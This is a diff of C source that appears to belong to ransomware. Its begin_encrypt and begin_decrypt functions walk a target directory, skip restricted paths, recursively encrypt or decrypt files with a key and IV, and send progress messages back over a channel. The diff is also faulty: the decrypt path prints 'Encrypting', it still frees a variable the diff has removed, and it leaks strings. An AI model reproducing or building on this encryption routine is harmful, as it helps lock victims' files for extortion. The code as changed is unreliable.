@@ -147,14 +147,21 @@ static int recursive_decrypt(char *path, char *key, char *iv)
 
 int begin_encrypt(int channel, char *path, char *key, char *iv)
 {
+    send_channel(channel,
+                 link_string(process, "Locating target files...\n", 0));
     DIR *fd = opendir(path);
 
-    if (fd == NULL)
+    if (fd == NULL) {
+        send_channel(channel,
+                     link_string(error, "Failed to locate target files!\n", 0));
         return -1;
+    }
 
-    char *name, *target;
+    char *target;
     struct dirent *dir;
 
+    send_channel(channel,
+                 link_string(process, "Beginning crypto operations...\n", 0));
     while ((dir = readdir(fd)) != NULL) {
         if (strcmp(dir->d_name, ".") != 0 &&
             strcmp(dir->d_name, "..") != 0 &&
@@ -166,14 +173,13 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
                 target = link_string(path, dir->d_name, 1);
 
             if (!is_restricted(target)) {
-                name = link_string(process, "Encrypting ", 0);
-                name = link_string(name, target, 0);
-                name = link_string(name, "...\n", 0);
+                send_channel(channel, link_string(
+                    link_string(link_string(process, "Encrypting ", 0),
+                        target, 0
+                    ), "...\n", 0
+                ));
 
-                send_channel(channel, name);
                 recursive_encrypt(target, key, iv);
-
-                free(name);
             }
 
             free(target);
@@ -181,19 +187,28 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
     }
 
     closedir(fd);
+    send_channel(channel, link_string(success,
+                                      "Crypto operations completed!\n", 0));
     return 0;
 }
 
 int begin_decrypt(int channel, char *path, char *key, char *iv)
 {
+    send_channel(channel, link_string(process,
+                                      "Locating target files...\n", 0));
     DIR *fd = opendir(path);
 
-    if (fd == NULL)
+    if (fd == NULL) {
+        send_channel(channel, link_string(error,
+                                          "Failed to locate target files!\n", 0));
         return -1;
+    }
 
-    char *name, *target;
+    char *target;
     struct dirent *dir;
 
+    send_channel(channel,
+                 link_string(process, "Beginning crypto operations...\n", 0));
     while ((dir = readdir(fd)) != NULL) {
         if (strcmp(dir->d_name, ".") != 0 &&
             strcmp(dir->d_name, "..") != 0) {
@@ -204,11 +219,12 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
                 target = link_string(path, dir->d_name, 1);
 
             if (!is_restricted(target)) {
-                name = link_string(process, "Decrypting ", 0);
-                name = link_string(name, target, 0);
-                name = link_string(name, "...\n", 0);
+                send_channel(channel, link_string(
+                    link_string(link_string(process, "Encrypting ", 0),
+                        target, 0
+                    ), "...\n", 0
+                ));
 
-                send_channel(channel, name);
                 recursive_decrypt(target, key, iv);
 
                 free(name);
@@ -219,5 +235,7 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
     }
 
     closedir(fd);
+    send_channel(channel, link_string(success,
+                                      "Crypto operations completed!\n", 0));
     return 0;
 }
